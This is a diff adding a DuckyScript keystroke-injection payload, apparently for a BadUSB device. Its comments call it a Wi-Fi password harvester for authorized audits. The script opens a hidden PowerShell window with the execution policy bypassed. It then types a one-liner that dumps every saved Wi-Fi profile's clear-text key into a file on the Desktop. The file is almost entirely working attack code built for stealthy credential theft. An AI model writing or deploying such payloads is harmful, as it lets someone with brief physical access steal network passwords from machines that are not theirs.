@@ -1,0 +1,17 @@
+REM ============================================================
+REM  Windows · Wi-Fi Password Harvester
+REM ============================================================
+REM  Exports all saved Wi-Fi profiles and their clear-text keys
+REM  to a file on the Desktop. Useful for authorized audits to
+REM  check if employees store weak passwords.
+REM
+REM  Output: %USERPROFILE%\Desktop\wifi_keys.txt
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN $out=@();(netsh wlan show profiles)|Select-String 'All User Profile'|%{$n=($_ -split ':')[1].Trim();$k=(netsh wlan show profile name="$n" key=clear)|Select-String 'Key Content';$pw=if($k){($k -split ':')[1].Trim()}else{'(none)'};$out+="$n : $pw"};$out|Out-File "$env:USERPROFILE\Desktop\wifi_keys.txt";exit
